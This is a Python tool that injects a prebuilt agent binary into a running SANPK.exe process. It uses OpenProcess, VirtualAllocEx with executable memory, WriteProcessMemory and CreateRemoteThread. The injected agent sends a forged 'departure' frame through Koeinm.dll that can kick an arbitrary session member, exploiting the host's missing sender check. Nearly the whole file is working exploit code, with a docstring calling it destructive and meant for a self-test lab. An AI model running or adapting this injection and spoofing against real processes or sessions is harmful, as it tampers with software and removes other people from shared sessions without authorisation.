#!/usr/bin/env python3
"""P61 injector — D8 departure frame with an arbitrary departing id (targeted kick test).

Arms ONE p61 D8 agent (p61_d8_build.py) inside SANPK.exe. The agent waits for the
trigger file, then submits BE32(8)+BE32(departing_id) through the reliable channel
(koeinm 0x4c80 then 0x4b60) exactly once and writes a 64-byte receipt.

Destructive: it can retire another member if the host does not validate the sender
(static: 0x10003dc6 -> 0x10003fd0 does not). Use only in the self-test lab, one
frame per run; the agent never retries.

Usage:
  python.exe p61_d8_inject.py --departing 182698283 --agent-bin 'Z:...\\agent_d8.bin' \
      --koeinm 'C:\\sgi\\run-3.5\\3I\\Koeinm.dll' --flag 'Z:...\\d8.flag' \
      --receipt 'Z:...\\d8.bin' [--state Z:...\\d8.json] [--force] [--plan]
"""
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT))

import p51_shadow_inject as base  # noqa: E402
import p61_d8_build as build  # noqa: E402

RVA_SEND = 0x4B60
RVA_GETHOST = 0x4C80
RVA_NETOBJ = 0x12170


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--target-name', default='SANPK.exe')
    ap.add_argument('--koeinm', default=r'C:\sgi\run-3.5\3I\Koeinm.dll')
    ap.add_argument('--agent-bin', required=True)
    ap.add_argument('--departing', type=int, required=True,
                    help='member id that should be retired (BE32 in the frame body)')
    ap.add_argument('--flag', required=True)
    ap.add_argument('--receipt', required=True)
    ap.add_argument('--state')
    ap.add_argument('--plan', action='store_true')
    ap.add_argument('--force', action='store_true')
    args = ap.parse_args()

    c, w, k = base._win()
    targets = base.find_process(args.target_name)
    if len(targets) != 1:
        raise SystemExit('%d processes named %s' % (len(targets), args.target_name))
    pid = targets[0][0]
    h = k.OpenProcess(0x0002 | 0x0008 | 0x0010 | 0x0020 | 0x0400, False, pid)
    if not h:
        raise SystemExit('OpenProcess failed err=%d' % c.get_last_error())
    created = base.process_creation(pid)

    def read_proc(addr, size):
        buf = c.create_string_buffer(size)
        got = c.c_size_t()
        ok = k.ReadProcessMemory(h, c.c_void_p(addr), buf, size, c.byref(got))
        return buf.raw if ok and got.value == size else None

    def write_proc(addr, data):
        got = c.c_size_t()
        ok = k.WriteProcessMemory(h, c.c_void_p(addr), data, len(data), c.byref(got))
        return bool(ok) and got.value == len(data)

    try:
        sanpk = base.find_module(pid, 'SANPK.exe')
        koeinm = base.find_module(pid, 'Koeinm.dll')
        if not sanpk or not koeinm:
            raise SystemExit('target modules missing')
        sanpk_base, koeinm_base = int(sanpk['base']), int(koeinm['base'])
        pointers = base.kernel32_pointers()
        k32_self = pointers.pop('_kernel32_base')
        target_k32 = base.find_module(pid, 'kernel32.dll')
        if not target_k32 or target_k32['base'] != k32_self:
            raise SystemExit('kernel32 base mismatch')
        pointers['send4b60'] = koeinm_base + RVA_SEND
        pointers['gethost4c80'] = koeinm_base + RVA_GETHOST
        netobj = koeinm_base + RVA_NETOBJ
        blob = build.build_blob(pointers, netobj=netobj, departing=args.departing,
                               flag_path=args.flag, receipt_path=args.receipt)
        plan = {'mode': 'd8_kick', 'pid': pid, 'sanpk': hex(sanpk_base),
                'koeinm': hex(koeinm_base), 'netobj': hex(netobj),
                'send': hex(pointers['send4b60']), 'gethost': hex(pointers['gethost4c80']),
                'departing': args.departing,
                'frame_hex': ('%08x' % 8) + ('%08x' % args.departing),
                'flag': args.flag, 'receipt': args.receipt}
        if args.plan:
            plan['plan_only'] = True
            print(json.dumps(plan, ensure_ascii=False, indent=2))
            return
        rp = Path(args.receipt)
        if rp.exists() and not args.force:
            raise SystemExit('receipt exists; one-shot discipline')
        code = Path(args.agent_bin).read_bytes()
        size = len(code) + len(blob) + 0x40
        addr = k.VirtualAllocEx(h, None, size, 0x3000, 0x40)
        if not addr:
            raise SystemExit('VirtualAllocEx failed err=%d' % c.get_last_error())
        blob_addr = addr + ((len(code) + 0xF) & ~0xF)
        if not write_proc(addr, code) or not write_proc(blob_addr, blob):
            raise SystemExit('WriteProcessMemory failed err=%d' % c.get_last_error())
        tid = w.DWORD(0)
        th = k.CreateRemoteThread(h, None, 0, c.c_void_p(addr), c.c_void_p(blob_addr),
                                  0, c.byref(tid))
        if not th:
            raise SystemExit('CreateRemoteThread failed err=%d' % c.get_last_error())
        k.CloseHandle(th)
        out = dict(plan, code_addr=hex(addr), blob_addr=hex(blob_addr),
                   thread_id=tid.value, creation=created)
        if args.state:
            Path(args.state).write_text(json.dumps(out, ensure_ascii=False, indent=2),
                                        encoding='utf-8')
        print(json.dumps(out, ensure_ascii=False, indent=2))
    finally:
        k.CloseHandle(h)


if __name__ == '__main__':
    main()
